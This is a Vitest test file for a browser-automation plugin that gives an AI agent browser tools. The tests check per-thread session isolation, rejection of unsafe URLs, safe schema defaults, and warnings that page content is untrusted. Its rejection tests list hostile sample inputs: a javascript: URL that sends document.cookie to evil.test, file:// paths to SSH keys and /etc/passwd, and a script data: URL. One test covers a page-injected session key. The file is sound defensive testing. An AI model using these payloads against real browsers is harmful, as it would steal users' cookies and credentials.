import { describe, expect, it, vi } from "vitest";
import type { z } from "zod";
import type { BbPluginApi } from "@get-bb/plugin-sdk";
import type { Actions } from "./actions.js";
import { registerTools, TOOL_NAMES } from "./tools.js";
import type { Runner } from "./goto.js";

interface Registered {
  name: string;
  description: string;
  parameters: z.ZodType;
  execute: (params: unknown, ctx: { threadId: string; projectId: string; signal: AbortSignal }) =>
    | unknown
    | Promise<unknown>;
}

function fakeActions() {
  return {
    open: vi.fn(async () => "opened"),
    read: vi.fn(async () => "page text"),
    snapshot: vi.fn(async () => "tree"),
    click: vi.fn(async () => "clicked"),
    type: vi.fn(async () => "typed"),
    upload: vi.fn(async () => "attached"),
    evaluate: vi.fn(async () => "42"),
    screenshot: vi.fn(async () => ({ base64: "aGVsbG8=" })),
    close: vi.fn(async () => "closed"),
  } satisfies Record<keyof Actions, unknown>;
}

/** Maps every thread to a distinct key, so a test can tell the tool used the resolver. */
const oneKeyEach = (threadId: string | undefined) =>
  threadId ? `key-for-${threadId}` : "scratch";

function register(
  operations = fakeActions(),
  resolve: (threadId: string | undefined) => string = oneKeyEach,
) {
  const tools: Registered[] = [];
  const bb = {
    agents: { registerTool: (tool: Registered) => tools.push(tool) },
  } as unknown as BbPluginApi;

  // The tools must use whatever the resolver returns, not the raw threadId.
  const resolveSessionKey = vi.fn(async (threadId: string | undefined) =>
    resolve(threadId),
  );

  // A fake `mx`: no test here may launch the real one, which would drive a real browser.
  const runner = vi.fn<Runner>(async () => ({
    code: 0,
    stdout: JSON.stringify({ rc: 0, status: "done", evidence: null, history: [] }),
    stderr: "",
  }));
  registerTools(
    bb,
    operations as unknown as Actions,
    resolveSessionKey,
    { show: async () => "shown" },
    runner,
  );
  const byName = (name: string) => {
    const tool = tools.find((candidate) => candidate.name === name);
    if (!tool) throw new Error(`tool not registered: ${name}`);
    return tool;
  };
  const ctx = (threadId: string) => ({
    threadId,
    projectId: "prj_1",
    signal: new AbortController().signal,
  });
  return { tools, byName, ctx, operations, resolveSessionKey, runner };
}

/** Every key a tool's parameter schema advertises to the model. */
function schemaKeys(tool: Registered): string[] {
  const shape = (tool.parameters as unknown as { shape?: Record<string, unknown> }).shape;
  return shape ? Object.keys(shape) : [];
}

describe("registerTools", () => {
  it("registers exactly the tools TOOL_NAMES promises server.ts", () => {
    const { tools } = register();
    expect(tools.map((tool) => tool.name)).toEqual([...TOOL_NAMES]);
  });

  // THE security boundary: a thread addresses its own page and no other. If a
  // tool ever accepted a session key as a parameter, one thread could drive
  // another thread's logged-in browser by asking for it.
  it("exposes no session, thread or key parameter on any tool", () => {
    const { tools } = register();
    for (const tool of tools) {
      for (const key of schemaKeys(tool)) {
        expect(key).not.toMatch(/session|thread|profile|key/i);
      }
    }
  });

  it("advertises only the parameters each operation actually needs", () => {
    const { byName } = register();
    expect(schemaKeys(byName("browser_open"))).toEqual(["url"]);
    expect(schemaKeys(byName("browser_read"))).toEqual([]);
    expect(schemaKeys(byName("browser_snapshot"))).toEqual(["interactive"]);
    expect(schemaKeys(byName("browser_click"))).toEqual(["selector"]);
    expect(schemaKeys(byName("browser_goto"))).toEqual(["goal", "url"]);
    expect(schemaKeys(byName("browser_type"))).toEqual(["selector", "text", "submit"]);
    expect(schemaKeys(byName("browser_eval"))).toEqual(["expression"]);
    expect(schemaKeys(byName("browser_close"))).toEqual([]);
    expect(schemaKeys(byName("browser_screenshot"))).toEqual([]);
  });

  // browser_show is the one tool that is not about a page: it asks for a
  // human, and the browser is shared, so it takes no session key by design.
  // Every OTHER tool must derive one — that is the boundary that stops a
  // thread reaching another thread's tab.
  const PAGELESS_TOOLS = ["browser_show"];
  // browser_goto drives the page through `mx`, which resolves the tab from the thread id
  // itself; its own arm below pins that it gets the CALLER's id and no other.
  const MX_TOOLS = ["browser_goto"];

  it("derives the session key from ctx.threadId, for every page tool", async () => {
    const { tools, byName, ctx, operations, resolveSessionKey } = register();
    const params: Record<string, unknown> = {
      browser_open: { url: "https://example.com" },
      browser_click: { selector: "#a" },
      browser_type: { selector: "#a", text: "x", submit: false },
      browser_eval: { expression: "1+1" },
      browser_snapshot: { interactive: true },
    };
    for (const tool of tools) {
      if (PAGELESS_TOOLS.includes(tool.name) || MX_TOOLS.includes(tool.name)) continue;
      await tool.execute(params[tool.name] ?? {}, ctx("thr_a"));
    }
    expect(resolveSessionKey).toHaveBeenCalledWith("thr_a");
    // Whatever the resolver returned is what reached the operation — first
    // argument, every time.
    const everyCall = Object.values(operations).flatMap(
      (fn) => fn.mock.calls as unknown as unknown[][],
    );
    expect(everyCall.length).toBe(tools.length - PAGELESS_TOOLS.length - MX_TOOLS.length);
    for (const call of everyCall) {
      expect(call[0]).toBe("key-for-thr_a");
    }
    expect(byName("browser_read")).toBeDefined();
  });

  it("runs browser_goto on the calling thread's own tab, and no other", async () => {
    const { byName, ctx, runner } = register();
    await byName("browser_goto").execute(
      { goal: "open the latest invoice", url: "https://example.com/" },
      ctx("thr_a"),
    );
    await byName("browser_goto").execute(
      { goal: "open the latest invoice", url: "https://example.com/" },
      ctx("thr_b"),
    );
    expect(runner.mock.calls.map((call) => call[1].BB_THREAD_ID)).toEqual(["thr_a", "thr_b"]);
  });

  it("reads the final url from the calling thread's own tab when the run kept it", async () => {
    const { byName, ctx, runner, operations } = register();
    const kept = { code: 0, stderr: "", stdout: JSON.stringify({ rc: 0, status: "done", evidence: null, tab: "kept" }) };
    runner.mockResolvedValueOnce(kept);
    const out = await byName("browser_goto").execute(
      { goal: "open the latest invoice", url: "https://example.com/" },
      ctx("thr_b"),
    );
    expect(operations.evaluate).toHaveBeenCalledWith("key-for-thr_b", "location.href");
    expect(out).toContain("final url: 42");
  });

  it("touches no tab when the run closed its own", async () => {
    const { byName, ctx, operations } = register();
    await byName("browser_goto").execute(
      { goal: "open the latest invoice", url: "https://example.com/" },
      ctx("thr_b"),
    );
    expect(operations.evaluate).not.toHaveBeenCalled();
  });

  it("gives two threads two different session keys", async () => {
    const { byName, ctx, operations } = register();
    await byName("browser_read").execute({}, ctx("thr_a"));
    await byName("browser_read").execute({}, ctx("thr_b"));
    expect(operations.read.mock.calls).toEqual([["key-for-thr_a"], ["key-for-thr_b"]]);
  });

  it("ignores any session key an injected page tries to smuggle in as a param", async () => {
    const { byName, ctx, operations } = register();
    await byName("browser_read").execute(
      { sessionKey: "thr_victim", threadId: "thr_victim" },
      ctx("thr_a"),
    );
    expect(operations.read).toHaveBeenCalledWith("key-for-thr_a");
  });

  it("passes each tool's parameters through to its operation", async () => {
    const { byName, ctx, operations } = register();
    await byName("browser_open").execute({ url: "https://example.com/" }, ctx("thr_a"));
    expect(operations.open).toHaveBeenCalledWith("key-for-thr_a", "https://example.com/");

    await byName("browser_type").execute(
      { selector: "#q", text: "hello", submit: true },
      ctx("thr_a"),
    );
    expect(operations.type).toHaveBeenCalledWith("key-for-thr_a", "#q", "hello", true);

    await byName("browser_snapshot").execute({ interactive: false }, ctx("thr_a"));
    expect(operations.snapshot).toHaveBeenCalledWith("key-for-thr_a", false);
  });

  // The identity resolver is what a ROOT thread really gets: createSessionKeyResolver
  // returns a thread id, so a thread that owns its page resolves to its own. The
  // default fixture returns a synthetic key on purpose (to prove the tools pass the
  // resolver's output through), and under it every thread looks like a non-owner —
  // which would prefix this shape with a shared-tab notice. The subject here is the
  // uncontended content part, so it takes the uncontended fixture.
  it("returns a well-formed image content part from browser_screenshot", async () => {
    const { byName, ctx } = register(fakeActions(), (threadId) => threadId ?? "scratch");
    const result = await byName("browser_screenshot").execute({}, ctx("thr_a"));
    expect(result).toEqual({
      content: [{ type: "image", data: "aGVsbG8=", mimeType: "image/png" }],
    });
  });

  // Every tool that can return page content says so. browser_show returns a
  // status line and no page text at all, so the warning would be noise there —
  // it carries its own caution instead, about relaunching mid-form.
  it("tells the model page content is untrusted, on every tool that returns any", () => {
    const { tools } = register();
    for (const tool of tools) {
      if (PAGELESS_TOOLS.includes(tool.name)) {
        expect(tool.description).toMatch(/relaunch/i);
        continue;
      }
      expect(tool.description).toMatch(/untrusted/i);
    }
  });
});

describe("browser_open's url schema", () => {
  const parse = (url: string) => {
    const { byName } = register();
    return byName("browser_open").parameters.safeParse({ url });
  };

  it.each([
    "file:///home/someone/.ssh/id_rsa",
    "file:///etc/passwd",
    "javascript:fetch('https://evil.test/'+document.cookie)",
    "data:text/html,<script>alert(1)</script>",
    "about:blank",
    "chrome://settings",
    "view-source:https://example.com",
    "ftp://example.com/secret.txt",
    "ws://127.0.0.1:9222/devtools/browser/abc",
    "blob:https://example.com/1234",
    "not a url",
  ])("rejects %s before it reaches the browser", (url) => {
    expect(parse(url).success).toBe(false);
  });

  it.each(["https://example.com/", "http://localhost:3000/x?y=1#z"])("accepts %s", (url) => {
    expect(parse(url).success).toBe(true);
  });
});

describe("browser_goto's url schema", () => {
  const parse = (url: string) => {
    const { byName } = register();
    return byName("browser_goto").parameters.safeParse({ goal: "find the page", url });
  };

  it.each(["file:///etc/passwd", "javascript:alert(1)", "data:text/html,x", "about:blank"])(
    "rejects %s before mx is launched",
    (url) => {
      expect(parse(url).success).toBe(false);
    },
  );

  it("accepts an https url", () => {
    expect(parse("https://example.com/").success).toBe(true);
  });
});

// Schema defaults are a safety surface, not a convenience.
//
// A mutation sweep flipped each of these with the whole suite still green.
// The defaults decide what happens when a model omits an argument, which is
// exactly when nobody is thinking about it: `submit` defaulting to true would
// press Enter on every fill — posting the comment, sending the message,
// submitting the form nobody asked to submit — on a surface whose input comes
// from pages this plugin treats as hostile.
describe("tool schema defaults", () => {
  it("does not submit when the model omits `submit`", () => {
    const { byName } = register();
    const parsed = byName("browser_type").parameters.parse({
      selector: "#q",
      text: "hello",
    }) as { submit: boolean };
    expect(parsed.submit).toBe(false);
  });

  it("still submits when the model asks for it", () => {
    const { byName } = register();
    const parsed = byName("browser_type").parameters.parse({
      selector: "#q",
      text: "hello",
      submit: true,
    }) as { submit: boolean };
    expect(parsed.submit).toBe(true);
  });

  it("snapshots the interactive tree when the model omits `interactive`", () => {
    const { byName } = register();
    const parsed = byName("browser_snapshot").parameters.parse({}) as {
      interactive: boolean;
    };
    expect(parsed.interactive).toBe(true);
  });

  it("passes the parsed default through to the operation", async () => {
    const { byName, ctx, operations } = register();
    const snapshot = byName("browser_snapshot");
    await snapshot.execute(snapshot.parameters.parse({}), ctx("thr_a"));
    expect(operations.snapshot).toHaveBeenCalledWith("key-for-thr_a", true);
  });
});

describe("tool schema required arguments", () => {
  it.each([
    ["browser_click", { selector: "" }],
    ["browser_type", { selector: "", text: "hi" }],
    ["browser_eval", { expression: "" }],
    ["browser_goto", { goal: "  ", url: "https://example.com/" }],
  ])("%s rejects an empty required string", (name, params) => {
    const { byName } = register();
    expect(byName(name).parameters.safeParse(params).success).toBe(false);
  });
});

// MX-1346: half of the first four agent calls were url-only. They still refuse, and the
// refusal now names browser_open. The control is a call WITH a goal, which must parse.
describe("browser_goto without a goal", () => {
  it.each([
    ["no goal at all", { url: "https://example.com/" }],
    ["a blank goal", { goal: "  ", url: "https://example.com/" }],
  ])("refuses and points at browser_open: %s", (_name, params) => {
    const { byName } = register();
    const parsed = byName("browser_goto").parameters.safeParse(params);
    expect(parsed.success).toBe(false);
    expect(JSON.stringify(parsed.error?.issues)).toContain("call browser_open instead");
  });

  it("accepts a call that has one", () => {
    const { byName } = register();
    const params = { goal: "open the latest invoice", url: "https://example.com/" };
    expect(byName("browser_goto").parameters.safeParse(params).success).toBe(true);
  });
});
